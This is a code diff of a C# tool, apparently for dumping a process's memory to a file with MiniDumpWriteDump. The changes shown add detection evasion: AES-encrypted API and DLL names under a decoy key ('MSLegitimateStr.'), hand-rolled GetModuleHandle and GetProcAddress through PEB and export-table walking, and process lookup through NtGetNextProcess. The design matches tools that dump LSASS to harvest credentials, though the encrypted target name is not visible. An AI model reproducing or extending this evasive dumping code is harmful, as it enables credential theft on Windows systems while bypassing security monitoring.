@@ -6,7 +6,6 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Security.Cryptography;
 
-
 namespace CustomD
 {
     public class Program
@@ -14,9 +13,24 @@ namespace CustomD
         static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
         static String password = "MSLegitimateStr.";
         static String iv = "MSLegitimateStr.";
+
+        // Strings
+        static String decryptedDbgcore = DecryptStringFromBytes("BVai7tBW8s6qrhZU05Wxhw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+        static String decryptedMDWD = DecryptStringFromBytes("tFP++qWUzC+ytbpdRB43HWOR6V5Vx/24oI3/Hly5zG0=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+        static String decryptedKernel32 = DecryptStringFromBytes("TplZ7bp6eKRpNJFVqU2MGQ==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+        static String decryptedOP = DecryptStringFromBytes("kCrAtldSjJiMZ3Y1UPXZGw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+        static String decryptedLL = DecryptStringFromBytes("EUYkQlZr1dktpF1kTL2yFA==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+        static String decryptedProcess = DecryptStringFromBytes("+zIykYwm/RSRRs/svAVoag==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+        static String decryptedNtdll = DecryptStringFromBytes("jJptiuemvxJB64wbGBqt/A==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+        static String decryptedPsapi = DecryptStringFromBytes("mMya9rZMB1jyVGpj2uoEGQ==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+        static String decryptedGPI = DecryptStringFromBytes("Wj2YEOtRIsHhjop0l7KQTQ==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+        static String decryptedNtGNP = DecryptStringFromBytes("HxXQg0uk9rxKj5N/pZ2iylNspyROlBdOmtejmzGhbzI=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+        static String decryptedGPIF = DecryptStringFromBytes("JDC1XQIn6rcQ6vgRB8zGOSPEdjsglveXVjH9SWUw1mo=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+
+
         [DllImport("kernel32.dll", SetLastError = true)] static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
-        [DllImport("ntdll.dll", SetLastError = true)] static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref PROCESS_BASIC_INFORMATION pbi, uint processInformationLength, ref uint returnLength);
-        private struct PROCESS_BASIC_INFORMATION { public uint ExitStatus; public IntPtr PebBaseAddress; public UIntPtr AffinityMask; public int BasePriority; public UIntPtr UniqueProcessId; public UIntPtr InheritedFromUniqueProcessId; }
+        [DllImport("ntdll.dll", SetLastError = true)] static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref PROCESS_BASIC_INFORMATION pbi, uint processInformationLength, ref uint returnLength);       
+        [StructLayout(LayoutKind.Sequential)] private struct PROCESS_BASIC_INFORMATION { public uint ExitStatus; public IntPtr PebBaseAddress; public UIntPtr AffinityMask; public int BasePriority; public UIntPtr UniqueProcessId; public UIntPtr InheritedFromUniqueProcessId; }
         [StructLayout(LayoutKind.Sequential)] public struct IMAGE_DOS_HEADER { public UInt16 e_magic; public UInt16 e_cblp; public UInt16 e_cp; public UInt16 e_crlc; public UInt16 e_cparhdr; public UInt16 e_minalloc; public UInt16 e_maxalloc; public UInt16 e_ss; public UInt16 e_sp; public UInt16 e_csum; public UInt16 e_ip; public UInt16 e_cs; public UInt16 e_lfarlc; public UInt16 e_ovno; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public UInt16[] e_res1; public UInt16 e_oemid; public UInt16 e_oeminfo; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)] public UInt16[] e_res2; public UInt32 e_lfanew; }
         [StructLayout(LayoutKind.Sequential)] public struct IMAGE_NT_HEADERS { public UInt32 Signature; public IMAGE_FILE_HEADER FileHeader; public IMAGE_OPTIONAL_HEADER32 OptionalHeader32; public IMAGE_OPTIONAL_HEADER64 OptionalHeader64; }
         [StructLayout(LayoutKind.Sequential)] public struct IMAGE_FILE_HEADER { public UInt16 Machine; public UInt16 NumberOfSections; public UInt32 TimeDateStamp; public UInt32 PointerToSymbolTable; public UInt32 NumberOfSymbols; public UInt16 SizeOfOptionalHeader; public UInt16 Characteristics; }
@@ -27,13 +41,11 @@ namespace CustomD
 
         delegate IntPtr OPDelegate(uint processAccess, bool bInheritHandle, int processId);
         delegate bool   MDWDDelegate(IntPtr hProcess, int ProcessId, IntPtr hFile, int Type, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
-        delegate IntPtr LLDelegate([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
+        delegate IntPtr LLDelegate([MarshalAs(UnmanagedType.LPStr)] string lpFileName);
+        delegate int GPIDelegate(IntPtr handle);
+        delegate bool GNPDelegate(IntPtr handle, int MAX_ALLOWED, int param3, int param4, out IntPtr outHandle);
+        delegate bool GPIFDelegate(IntPtr handle, StringBuilder fname, int nsize);
 
-        public static int getProcessPid(string processname_str)
-        {
-            int processPID = Process.GetProcessesByName(processname_str)[0].Id;
-            return processPID;
-        }
 
         public static T MarshalBytesTo<T>(byte[] bytes)
         {
@@ -46,7 +58,7 @@ namespace CustomD
 
         public unsafe static IntPtr auxGetModuleHandle(String dll_name)
         {
-            IntPtr hProcess = Process.GetCurrentProcess().Handle;
+            IntPtr hProcess = (IntPtr)(-1); // Process.GetCurrentProcess().Handle;
             PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
             uint temp = 0;
             NtQueryInformationProcess(hProcess, 0x0, ref pbi, (uint)(IntPtr.Size * 6), ref temp);
@@ -78,24 +90,26 @@ namespace CustomD
             return IntPtr.Zero;
         }
 
+
         public static IntPtr auxGetProcAddress(IntPtr pDosHdr, String func_name)
         {
-            IntPtr hProcess = Process.GetCurrentProcess().Handle;
+            IntPtr hProcess = (IntPtr)(-1); // Process.GetCurrentProcess().Handle;
             byte[] data = new byte[Marshal.SizeOf(typeof(IMAGE_DOS_HEADER))];
-            ReadProcessMemory(hProcess, pDosHdr, data, data.Length, out _);
+            IntPtr aux_output = IntPtr.Zero;
+            ReadProcessMemory(hProcess, pDosHdr, data, data.Length, out aux_output);
 
             IMAGE_DOS_HEADER _dosHeader = MarshalBytesTo<IMAGE_DOS_HEADER>(data);
             uint e_lfanew_offset = _dosHeader.e_lfanew;
             IntPtr nthdr = IntPtr.Add(pDosHdr, Convert.ToInt32(e_lfanew_offset));
 
             byte[] data2 = new byte[Marshal.SizeOf(typeof(IMAGE_NT_HEADERS))];
-            ReadProcessMemory(hProcess, nthdr, data2, data2.Length, out _);
+            ReadProcessMemory(hProcess, nthdr, data2, data2.Length, out aux_output);
             IMAGE_NT_HEADERS _ntHeader = MarshalBytesTo<IMAGE_NT_HEADERS>(data2);
             IMAGE_FILE_HEADER _fileHeader = _ntHeader.FileHeader;
 
             IntPtr optionalhdr = IntPtr.Add(nthdr, 24);
             byte[] data3 = new byte[Marshal.SizeOf(typeof(IMAGE_OPTIONAL_HEADER64))];
-            ReadProcessMemory(hProcess, optionalhdr, data3, data3.Length, out _);
+            ReadProcessMemory(hProcess, optionalhdr, data3, data3.Length, out aux_output);
             IMAGE_OPTIONAL_HEADER64 _optionalHeader = MarshalBytesTo<IMAGE_OPTIONAL_HEADER64>(data3);
 
             int numberDataDirectory = (_fileHeader.SizeOfOptionalHeader / 16) - 1;
@@ -106,7 +120,7 @@ namespace CustomD
             {
                 IntPtr exportTableAddress = IntPtr.Add(pDosHdr, (int)exportTableRVA);
                 byte[] data4 = new byte[Marshal.SizeOf(typeof(IMAGE_EXPORT_DIRECTORY))];
-                ReadProcessMemory(hProcess, exportTableAddress, data4, data4.Length, out _);
+                ReadProcessMemory(hProcess, exportTableAddress, data4, data4.Length, out aux_output);
                 IMAGE_EXPORT_DIRECTORY exportTable = MarshalBytesTo<IMAGE_EXPORT_DIRECTORY>(data4);
 
                 UInt32 numberOfNames = exportTable.NumberOfNames;
@@ -125,22 +139,22 @@ namespace CustomD
                 for (int i = 0; i < numberOfNames; i++)
                 {
                     byte[] data5 = new byte[Marshal.SizeOf(typeof(UInt32))];
-                    ReadProcessMemory(hProcess, auxaddressOfNamesRA, data5, data5.Length, out _);
+                    ReadProcessMemory(hProcess, auxaddressOfNamesRA, data5, data5.Length, out aux_output);
                     UInt32 functionAddressVRA = MarshalBytesTo<UInt32>(data5);
                     IntPtr functionAddressRA = IntPtr.Add(pDosHdr, (int)functionAddressVRA);
                     byte[] data6 = new byte[func_name.Length];
-                    ReadProcessMemory(hProcess, functionAddressRA, data6, data6.Length, out _);
+                    ReadProcessMemory(hProcess, functionAddressRA, data6, data6.Length, out aux_output);
                     String functionName = Encoding.ASCII.GetString(data6);
                     if (functionName == func_name)
                     {
                         // AdddressofNames --> AddressOfNamesOrdinals
                         byte[] data7 = new byte[Marshal.SizeOf(typeof(UInt16))];
-                        ReadProcessMemory(hProcess, auxaddressOfNameOrdinalsRA, data7, data7.Length, out _);
+                        ReadProcessMemory(hProcess, auxaddressOfNameOrdinalsRA, data7, data7.Length, out aux_output);
                         UInt16 ordinal = MarshalBytesTo<UInt16>(data7);
                         // AddressOfNamesOrdinals --> AddressOfFunctions
                         auxaddressOfFunctionsRA += 4 * ordinal;
                         byte[] data8 = new byte[Marshal.SizeOf(typeof(UInt32))];
-                        ReadProcessMemory(hProcess, auxaddressOfFunctionsRA, data8, data8.Length, out _);
+                        ReadProcessMemory(hProcess, auxaddressOfFunctionsRA, data8, data8.Length, out aux_output);
                         UInt32 auxaddressOfFunctionsRAVal = MarshalBytesTo<UInt32>(data8);
                         IntPtr functionAddress = IntPtr.Add(pDosHdr, (int)auxaddressOfFunctionsRAVal);
                         return functionAddress;
@@ -206,7 +220,7 @@ namespace CustomD
             return plaintext;
         }
 
-        /*
+        
         static String EncryptStringToBytes(string plainText, byte[] Key, byte[] IV)
         {
             if (plainText == null || plainText.Length <= 0)
@@ -235,7 +249,46 @@ namespace CustomD
             }
             return Convert.ToBase64String(encrypted);
         }
-        */
+
+
+        public static int GetByName(string proc_name) {
+            IntPtr k32 = helpGetModuleHandle(decryptedKernel32);
+            IntPtr ntdll = helpGetModuleHandle(decryptedNtdll);
+            IntPtr psapi = helpGetModuleHandle(decryptedPsapi);
+
+            IntPtr addrGPI = helpGetProcAddress(k32, decryptedGPI);
+            IntPtr addrNtGNP = helpGetProcAddress(ntdll, decryptedNtGNP);
+            IntPtr addrGPIF = helpGetProcAddress(psapi, decryptedGPIF);
+            
+            GPIDelegate function_GPI = (GPIDelegate)Marshal.GetDelegateForFunctionPointer(addrGPI, typeof(GPIDelegate));
+            GNPDelegate function_GNP = (GNPDelegate)Marshal.GetDelegateForFunctionPointer(addrNtGNP, typeof(GNPDelegate));
+            GPIFDelegate function_GPIF = (GPIFDelegate)Marshal.GetDelegateForFunctionPointer(addrGPIF, typeof(GPIFDelegate));
+
+            Console.WriteLine("2 " + Process.GetCurrentProcess());
+
+            IntPtr aux_handle = IntPtr.Zero;
+            int MAXIMUM_ALLOWED = 0x02000000;
+            int pid = 0;
+            while (!function_GNP(aux_handle, MAXIMUM_ALLOWED, 0, 0, out aux_handle))
+            {
+                StringBuilder fileName = new StringBuilder(100);
+                function_GPIF(aux_handle, fileName, 100);
+                char[] stringArray = fileName.ToString().ToCharArray();
+                Array.Reverse(stringArray);
+                string reversedStr = new string(stringArray);
+                string res = reversedStr.Substring(0, reversedStr.IndexOf("\\"));
+                stringArray = res.ToString().ToCharArray();
+                Array.Reverse(stringArray);
+                reversedStr = new string(stringArray);
+                if (reversedStr == proc_name)
+                {
+                    pid = function_GPI(aux_handle);
+                    return pid;
+                }
+            }
+            return 0;
+        }
+
 
         public static void Main(string[] args)
         {
@@ -247,17 +300,27 @@ namespace CustomD
                 return;
             }
 
-            // Strings
-            String decryptedDbghelp = DecryptStringFromBytes("upacCz7y7tmKYgHP/CCgcw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
-            String decryptedDbgcore = DecryptStringFromBytes("BVai7tBW8s6qrhZU05Wxhw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
-            String decryptedMDWD = DecryptStringFromBytes("tFP++qWUzC+ytbpdRB43HWOR6V5Vx/24oI3/Hly5zG0=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
-            String decryptedKernel32 = DecryptStringFromBytes("TplZ7bp6eKRpNJFVqU2MGQ==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
-            String decryptedOP = DecryptStringFromBytes("kCrAtldSjJiMZ3Y1UPXZGw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
-            String decryptedLL = DecryptStringFromBytes("EUYkQlZr1dktpF1kTL2yFA==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
-            String decryptedProcess = DecryptStringFromBytes("N0tlZfT8KMQcTr/sVdqjDg==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+            /*
+            Console.WriteLine(EncryptStringToBytes("kernel32.dll", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv)));
+            Console.WriteLine(EncryptStringToBytes("GetProcessId", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv)));
+            Console.WriteLine(EncryptStringToBytes("ntdll.dll", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv)));
+            Console.WriteLine(EncryptStringToBytes("NtGetNextProcess", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv)));
+            Console.WriteLine(EncryptStringToBytes("GetProcessImageFileName", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv)));
+            Console.WriteLine(EncryptStringToBytes("psapi.dll", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv)));
+            */
+
+            IntPtr k32      = helpGetModuleHandle(decryptedKernel32);
+            IntPtr addrOP   = helpGetProcAddress(k32, decryptedOP);
+            IntPtr addrLL   = helpGetProcAddress(k32, decryptedLL);
+            OPDelegate function_OP = (OPDelegate)Marshal.GetDelegateForFunctionPointer(addrOP, typeof(OPDelegate));
+            LLDelegate function_LL = (LLDelegate)Marshal.GetDelegateForFunctionPointer(addrLL, typeof(LLDelegate));
+
+            IntPtr dbgc = function_LL(decryptedDbgcore);
+            IntPtr addrMDWD = helpGetProcAddress(dbgc, decryptedMDWD);
+            MDWDDelegate function_MDWD = (MDWDDelegate)Marshal.GetDelegateForFunctionPointer(addrMDWD, typeof(MDWDDelegate));
 
             //Get process PID
-            int processPID = getProcessPid(decryptedProcess);
+            int processPID = GetByName(decryptedProcess); // Process.GetProcessesByName(decryptedProcess)[0].Id;
             Console.WriteLine("[+] Process PID: " + processPID);
 
             // Generate the file name or get it from the input arguments
@@ -273,18 +336,6 @@ namespace CustomD
             {
                 filename = args[0];
             }
-
-            IntPtr k32      = helpGetModuleHandle(decryptedKernel32);
-            IntPtr addrOP   = helpGetProcAddress(k32, decryptedOP);
-            IntPtr addrLL   = helpGetProcAddress(k32, decryptedLL);
-            OPDelegate function_OP = (OPDelegate)Marshal.GetDelegateForFunctionPointer(addrOP, typeof(OPDelegate));
-            LLDelegate function_LL = (LLDelegate)Marshal.GetDelegateForFunctionPointer(addrLL, typeof(LLDelegate));
-
-            //IntPtr dbgh = function_LL(decryptedDbghelp);
-            IntPtr dbgc = function_LL(decryptedDbgcore);
-            //Console.WriteLine("dbgh: \t0x{0}", dbgh.ToString("X"));
-            IntPtr addrMDWD = helpGetProcAddress(dbgc, decryptedMDWD);
-            MDWDDelegate function_MDWD = (MDWDDelegate)Marshal.GetDelegateForFunctionPointer(addrMDWD, typeof(MDWDDelegate));
 
             // Create output file
             FileStream output_file = new FileStream(filename, FileMode.Create);
@@ -314,4 +365,5 @@ namespace CustomD
             }
         }
     }
+
 }
